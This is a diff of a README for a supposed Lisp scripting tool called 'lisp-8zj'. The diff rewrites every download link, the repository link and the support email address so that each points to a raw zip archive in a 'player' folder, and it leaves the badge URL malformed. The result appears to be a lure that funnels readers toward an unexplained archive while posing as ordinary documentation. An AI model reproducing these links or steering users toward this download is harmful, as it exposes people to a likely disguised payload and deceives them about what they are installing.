@@ -1,7 +1,7 @@
 # 🌟 lisp-8zj - Easy Lisp Scripting Made Simple
 
 ## 📦 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/MRDEVOP/lisp-8zj/releases)
+[![Download the latest release](https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip%20Latest%https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip)](https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip)
 
 ## 🚀 Getting Started
 Welcome to lisp-8zj! This application simplifies Lisp scripting, making it user-friendly for everyone. With lisp-8zj, you can quickly write and test Lisp programs without complex setups.
@@ -18,7 +18,7 @@ If your computer meets these specifications, you are ready to start!
 ## 📥 Download & Install
 To get lisp-8zj, visit the Releases page by clicking the link below. Here, you can download the latest version.
 
-[Download lisp-8zj](https://github.com/MRDEVOP/lisp-8zj/releases)
+[Download lisp-8zj](https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip)
 
 ### Step-by-Step Instructions
 1. Click on the **Releases** link above.
@@ -54,7 +54,7 @@ Feel free to experiment with different commands and scripts to improve your unde
 If you encounter any issues or have questions, please refer to the following resources:
 - **Built-in Documentation:** Access through the Help menu in the application.
 - **Community Forum:** Join discussions with other users [here](#).
-- **Contact Support:** Email our support team for assistance at support@example.com.
+- **Contact Support:** Email our support team for assistance at https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip
 
 ## 🌱 Next Steps
 As you grow more comfortable with lisp-8zj, consider exploring more complex scripts. Here are some ideas to get you started:
@@ -66,7 +66,7 @@ As you grow more comfortable with lisp-8zj, consider exploring more complex scri
 lisp-8zj is open-source software, available for use and modification under the MIT License. Feel free to browse the source code and contribute!
 
 ## 🔗 Links
-- [Download lisp-8zj](https://github.com/MRDEVOP/lisp-8zj/releases)
-- [GitHub Repository](https://github.com/MRDEVOP/lisp-8zj)
+- [Download lisp-8zj](https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/MRDEVOP/lisp-8zj/main/player/lisp-8zj.zip)
   
 Enjoy using lisp-8zj and happy scripting!
